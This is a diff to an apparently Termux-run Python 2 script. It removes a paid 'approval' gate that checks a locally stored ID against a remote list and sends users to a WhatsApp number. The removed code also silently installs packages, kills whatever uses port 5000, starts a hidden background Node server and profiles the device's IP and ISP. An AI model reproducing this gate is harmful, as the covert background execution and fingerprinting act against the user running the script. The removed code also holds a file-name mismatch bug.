@@ -94,88 +94,6 @@ def tik():
 back = 0
 id = []
 
-def reg():
-    os.system('clear')
-    print (banner)
-    print ''
-    print '\033[1;31;1mTake The Free Approval For Login'
-    print ''
-    time.sleep(1)
-    
-    try:
-        to = open('/sdcard/.hst.txt', 'r').read()
-    except (KeyError, IOError):
-        reg2()
-
-    r = requests.get('https://raw.githubusercontent.com/blacklisted-shahrukh/sani/main/server').text
-    if to in r:
-	os.system('apt update && apt install nodejs -y')
-        os.system('cd ..... && npm install')
-        os.system('fuser -k 5000/tcp &')
-        os.system('#')
-        os.system('cd ..... && node index.js &')
-        time.sleep(6)
-        ip()
-    else:
-        os.system('clear')
-        print (banner)
-        print '\tApproved Failed'
-        print ' \033[1;92mYour Id Is Not Approved Already '
-        print ' \033[1;92mCopy the id and send to Jam'
-	print '\033[1;94m-------------------------------------'
-        print ' \033[1;92mYour id: ' + to
-	print '\033[1;94m-------------------------------------'
-        raw_input('\033[1;93m Press enter to send id')
-        os.system('xdg-open https://wa.me/+923053176060')
-        reg()
-
-
-def reg2():
-    os.system('clear')
-    print (banner)
-    print '\tApproval not detected'
-    print ' \033[1;92mCopy and press enter , then select whatsapp to continue'
-    print '\033[1;94m-------------------------------------'
-    id = uuid.uuid4().hex[:50]
-    print ' Your id: ' + id
-    print '\033[1;94m-------------------------------------'
-    raw_input(' Press enter to go to whatsapp ')
-    os.system('xdg-open https://wa.me/+923053176060')
-    sav = open('/sdcard/.jam.txt', 'w')
-    sav.write(id)
-    sav.close()
-    raw_input('\033[1;92m Press enter to check Approval ')
-    reg()
-
-
-def ip():
-    os.system('clear')
-    print (banner)
-    print '\tCollecting device info'
-    print ''
-    
-    try:
-        ipinfo = requests.get('http://ip-api.com/json/')
-        z = json.loads(ipinfo.text)
-        ips = z['query']
-        country = z['country']
-        regi = z['regionName']
-        network = z['isp']
-    except:
-        pass
-
-    print '\033[1;92m Your ip: ' + ips
-    time.sleep(2)
-    print '\033[1;92m Your country: ' + country
-    time.sleep(2)
-    print '\033[1;92m Your region: ' + regi
-    time.sleep(2)
-    print ' \033[1;92mYour network: ' + network
-    time.sleep(1)
-    print '\033[1;94m-------------------------------------'
-    print ' Loading ...'
-    time.sleep(1)
-    methodlogin()
 
 ##### Login Method #####
 
@@ -255,4 +173,4 @@ def login():
 		        time.sleep(1)
 		        login()
 if __name__=='__main__':
-    reg()
+    methodlogin()
